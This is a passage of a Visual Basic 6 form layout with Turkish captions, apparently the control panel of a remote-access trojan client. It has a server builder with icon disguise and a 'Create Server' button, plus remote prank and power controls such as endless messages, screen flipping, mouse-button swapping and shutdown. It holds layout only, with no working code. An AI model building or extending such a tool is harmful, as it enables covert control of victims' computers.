         ForeColor       =   &H80000008&
         Height          =   645
         Index           =   17
         Left            =   120
         TabIndex        =   187
         Top             =   1440
         Width           =   2295
         Begin VB.TextBox servereditortxt 
            Appearance      =   0  'Flat
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   285
            Index           =   0
            Left            =   840
            MaxLength       =   25
            TabIndex        =   188
            Top             =   240
            Width           =   1335
         End
         Begin VB.Label lbl 
            Appearance      =   0  'Flat
            AutoSize        =   -1  'True
            BackColor       =   &H00000080&
            BackStyle       =   0  'Transparent
            Caption         =   "Adres : "
            ForeColor       =   &H00000000&
            Height          =   195
            Index           =   24
            Left            =   120
            TabIndex        =   189
            Top             =   255
            Width           =   570
         End
      End
      Begin VB.Frame fun 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "Simge Ayarlarý"
         ForeColor       =   &H80000008&
         Height          =   855
         Index           =   15
         Left            =   120
         TabIndex        =   184
         Top             =   360
         Width           =   2295
         Begin Client.cmd btn 
            Height          =   495
            Index           =   100
            Left            =   840
            TabIndex        =   185
            ToolTipText     =   "Select Icon"
            Top             =   240
            Width           =   615
            _ExtentX        =   1085
            _ExtentY        =   873
            BTYPE           =   3
            TX              =   ""
            ENAB            =   -1  'True
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":27B42
            PICN            =   "Form1.frx":27E5C
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
         Begin Client.cmd btn 
            Height          =   495
            Index           =   101
            Left            =   1560
            TabIndex        =   186
            ToolTipText     =   "Icon Hunter"
            Top             =   240
            Width           =   615
            _ExtentX        =   1085
            _ExtentY        =   873
            BTYPE           =   3
            TX              =   ""
            ENAB            =   -1  'True
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":281AE
            PICN            =   "Form1.frx":284C8
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
         Begin VB.Image editoricon 
            Appearance      =   0  'Flat
            BorderStyle     =   1  'Fixed Single
            Height          =   495
            Left            =   120
            Stretch         =   -1  'True
            Top             =   240
            Width           =   615
         End
      End
      Begin Client.cmd btn 
         Height          =   615
         Index           =   103
         Left            =   6000
         TabIndex        =   216
         ToolTipText     =   "Create Server"
         Top             =   4230
         Width           =   615
         _ExtentX        =   1085
         _ExtentY        =   1085
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":289CA
         PICN            =   "Form1.frx":28CE4
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin VB.Label lbl 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         Caption         =   "Server Editor"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   34
         Left            =   0
         TabIndex        =   183
         Top             =   0
         Width           =   6735
      End
   End
   Begin VB.PictureBox ortacerceve 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   5175
      Index           =   13
      Left            =   12600
      ScaleHeight     =   5145
      ScaleWidth      =   6705
      TabIndex        =   176
      Top             =   4320
      Width           =   6735
      Begin Client.cmd btn 
         Height          =   495
         Index           =   96
         Left            =   6120
         TabIndex        =   178
         ToolTipText     =   "server ayarlarýný al"
         Top             =   360
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":29036
         PICN            =   "Form1.frx":29350
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   97
         Left            =   6120
         TabIndex        =   179
         ToolTipText     =   "server ayarlarini kaydet"
         Top             =   960
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":29662
         PICN            =   "Form1.frx":2997C
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   98
         Left            =   6120
         TabIndex        =   180
         ToolTipText     =   "serveri geçici olarak kapat"
         Top             =   1560
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":29C8E
         PICN            =   "Form1.frx":29FA8
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   99
         Left            =   6120
         TabIndex        =   181
         ToolTipText     =   "serveri tamamen kaldýr"
         Top             =   2160
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":2A2CA
         PICN            =   "Form1.frx":2A5E4
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin MSComctlLib.ListView lvw 
         Height          =   4695
         Index           =   1
         Left            =   120
         TabIndex        =   232
         Top             =   360
         Width           =   5895
         _ExtentX        =   10398
         _ExtentY        =   8281
         View            =   3
         LabelWrap       =   -1  'True
         HideSelection   =   -1  'True
         GridLines       =   -1  'True
         _Version        =   393217
         Icons           =   "sysinfolist"
         SmallIcons      =   "sysinfolist"
         ForeColor       =   -2147483640
         BackColor       =   -2147483643
         BorderStyle     =   1
         Appearance      =   0
         MousePointer    =   99
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         NumItems        =   2
         BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            Text            =   "Properties"
            Object.Width           =   5644
         EndProperty
         BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   1
            Text            =   "Value"
            Object.Width           =   4233
         EndProperty
      End
      Begin VB.Label lbl 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         Caption         =   "Server Ayarlarý"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   21
         Left            =   0
         TabIndex        =   177
         Top             =   0
         Width           =   6735
      End
   End
   Begin VB.PictureBox ortacerceve 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   5175
      Index           =   12
      Left            =   12600
      ScaleHeight     =   5145
      ScaleWidth      =   6705
      TabIndex        =   118
      Top             =   3960
      Width           =   6735
      Begin VB.Frame fun 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "Sonsuz Mesaj Gönder"
         ForeColor       =   &H80000008&
         Height          =   1215
         Index           =   14
         Left            =   4200
         TabIndex        =   172
         Top             =   3840
         Width           =   2415
         Begin VB.TextBox txtfunerror 
            Appearance      =   0  'Flat
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   285
            Left            =   120
            TabIndex        =   174
            Text            =   "biadox was here!!!"
            Top             =   240
            Width           =   2175
         End
         Begin Client.cmd btn 
            Height          =   495
            Index           =   94
            Left            =   120
            TabIndex        =   173
            ToolTipText     =   "sonsuz mesaj gönder"
            Top             =   600
            Width           =   495
            _ExtentX        =   873
            _ExtentY        =   873
            BTYPE           =   3
            TX              =   ""
            ENAB            =   -1  'True
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":2AAE6
            PICN            =   "Form1.frx":2AE00
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
         Begin Client.cmd btn 
            Height          =   495
            Index           =   95
            Left            =   1800
            TabIndex        =   175
            ToolTipText     =   "mesaj göndermeyi durdur"
            Top             =   600
            Width           =   495
            _ExtentX        =   873
            _ExtentY        =   873
            BTYPE           =   3
            TX              =   ""
            ENAB            =   -1  'True
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":2B152
            PICN            =   "Form1.frx":2B46C
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
      End
      Begin VB.Frame fun 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "Scroll"
         ForeColor       =   &H80000008&
         Height          =   1455
         Index           =   13
         Left            =   5880
         TabIndex        =   169
         Top             =   2280
         Width           =   735
         Begin Client.cmd btn 
            Height          =   495
            Index           =   92
            Left            =   120
            TabIndex        =   170
            ToolTipText     =   "scrolllock ýþýðýný yak"
            Top             =   240
            Width           =   495
            _ExtentX        =   873
            _ExtentY        =   873
            BTYPE           =   3
            TX              =   ""
            ENAB            =   -1  'True
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":2B7BE
            PICN            =   "Form1.frx":2BAD8
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
         Begin Client.cmd btn 
            Height          =   495
            Index           =   93
            Left            =   120
            TabIndex        =   171
            ToolTipText     =   "scrolllock ýþýðýný söndür"
            Top             =   840
            Width           =   495
            _ExtentX        =   873
            _ExtentY        =   873
            BTYPE           =   3
            TX              =   ""
            ENAB            =   -1  'True
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":2C15A
            PICN            =   "Form1.frx":2C474
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
      End
      Begin VB.Frame fun 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "Caps"
         ForeColor       =   &H80000008&
         Height          =   1455
         Index           =   12
         Left            =   5040
         TabIndex        =   166
         Top             =   2280
         Width           =   735
         Begin Client.cmd btn 
            Height          =   495
            Index           =   90
            Left            =   120
            TabIndex        =   167
            ToolTipText     =   "capslock ýþýðýný yak"
            Top             =   240
            Width           =   495
            _ExtentX        =   873
            _ExtentY        =   873
            BTYPE           =   3
            TX              =   ""
            ENAB            =   -1  'True
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":2C976
            PICN            =   "Form1.frx":2CC90
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
         Begin Client.cmd btn 
            Height          =   495
            Index           =   91
            Left            =   120
            TabIndex        =   168
            ToolTipText     =   "capslock ýþýðýný söndür"
            Top             =   840
            Width           =   495
            _ExtentX        =   873
            _ExtentY        =   873
            BTYPE           =   3
            TX              =   ""
            ENAB            =   -1  'True
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":2D312
            PICN            =   "Form1.frx":2D62C
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
      End
      Begin VB.Frame fun 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "Num"
         ForeColor       =   &H80000008&
         Height          =   1455
         Index           =   11
         Left            =   4200
         TabIndex        =   163
         Top             =   2280
         Width           =   735
         Begin Client.cmd btn 
            Height          =   495
            Index           =   88
            Left            =   120
            TabIndex        =   164
            ToolTipText     =   "numlock ýþýðýný yak"
            Top             =   240
            Width           =   495
            _ExtentX        =   873
            _ExtentY        =   873
            BTYPE           =   3
            TX              =   ""
            ENAB            =   -1  'True
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":2DB2E
            PICN            =   "Form1.frx":2DE48
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
         Begin Client.cmd btn 
            Height          =   495
            Index           =   89
            Left            =   120
            TabIndex        =   165
            ToolTipText     =   "numlock ýþýðýný söndür"
            Top             =   840
            Width           =   495
            _ExtentX        =   873
            _ExtentY        =   873
            BTYPE           =   3
            TX              =   ""
            ENAB            =   -1  'True
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":2E4CA
            PICN            =   "Form1.frx":2E7E4
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
      End
      Begin VB.Frame fun 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "Fare Tuþlarý"
         ForeColor       =   &H80000008&
         Height          =   855
         Index           =   10
         Left            =   2760
         TabIndex        =   160
         Top             =   3240
         Width           =   1335
         Begin Client.cmd btn 
            Height          =   495
            Index           =   86
            Left            =   120
            TabIndex        =   161
            ToolTipText     =   "fare tuþlarýný deðiþtir"
            Top             =   240
            Width           =   495
            _ExtentX        =   873
            _ExtentY        =   873
            BTYPE           =   3
            TX              =   ""
            ENAB            =   -1  'True
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":2ECE6
            PICN            =   "Form1.frx":2F000
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
         Begin Client.cmd btn 
            Height          =   495
            Index           =   87
            Left            =   720
            TabIndex        =   162
            ToolTipText     =   "fare tuþlarýný düzelt"
            Top             =   240
            Width           =   495
            _ExtentX        =   873
            _ExtentY        =   873
            BTYPE           =   3
            TX              =   ""
            ENAB            =   -1  'True
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":2F3B2
            PICN            =   "Form1.frx":2F6CC
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
      End
      Begin VB.Frame fun 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "Ekraný Çevir"
         ForeColor       =   &H80000008&
         Height          =   1815
         Index           =   9
         Left            =   4200
         TabIndex        =   157
         Top             =   360
         Width           =   2415
         Begin Client.cmd btn 
            Height          =   1455
            Index           =   84
            Left            =   120
            TabIndex        =   158
            ToolTipText     =   "ekraný yatay çevir"
            Top             =   240
            Width           =   1035
            _ExtentX        =   1826
            _ExtentY        =   2566
            BTYPE           =   3
            TX              =   ""
            ENAB            =   -1  'True
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":2FA7E
            PICN            =   "Form1.frx":2FD98
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
         Begin Client.cmd btn 
            Height          =   1455
            Index           =   85
            Left            =   1260
            TabIndex        =   159
            ToolTipText     =   "ekraný dikey çevir"
            Top             =   240
            Width           =   1035
            _ExtentX        =   1826
            _ExtentY        =   2566
            BTYPE           =   3
            TX              =   ""
            ENAB            =   -1  'True
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":334C2
            PICN            =   "Form1.frx":337DC
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
      End
      Begin VB.Frame fun 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "Bilgisayar"
         ForeColor       =   &H80000008&
         Height          =   855
         Index           =   8
         Left            =   120
         TabIndex        =   152
         Top             =   4200
         Width           =   2535
         Begin Client.cmd btn 
            Height          =   495
            Index           =   80
            Left            =   120
            TabIndex        =   153
            ToolTipText     =   "bilgisayari kapat"
            Top             =   240
            Width           =   495
            _ExtentX        =   873
            _ExtentY        =   873
            BTYPE           =   3
            TX              =   ""
            ENAB            =   -1  'True
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":36F06
            PICN            =   "Form1.frx":37220
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
         Begin Client.cmd btn 
            Height          =   495
            Index           =   81
            Left            =   720
            TabIndex        =   154
            ToolTipText     =   "yeniden  baþlat"
            Top             =   240
            Width           =   495
            _ExtentX        =   873
            _ExtentY        =   873
            BTYPE           =   3
            TX              =   ""
            ENAB            =   -1  'True
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":37932
            PICN            =   "Form1.frx":37C4C
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
         Begin Client.cmd btn 
            Height          =   495
            Index           =   82
            Left            =   1320
            TabIndex        =   155
            ToolTipText     =   "oturumu kapat"
            Top             =   240
            Width           =   495
            _ExtentX        =   873
            _ExtentY        =   873
            BTYPE           =   3
            TX              =   ""
            ENAB            =   -1  'True
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":38316
            PICN            =   "Form1.frx":38630
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
         Begin Client.cmd btn 
            Height          =   495
            Index           =   83
            Left            =   1920
            TabIndex        =   156
            ToolTipText     =   "hazýrda beklet"
            Top             =   240
            Width           =   495
            _ExtentX        =   873
            _ExtentY        =   873
            BTYPE           =   3
            TX              =   ""
            ENAB            =   -1  'True
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
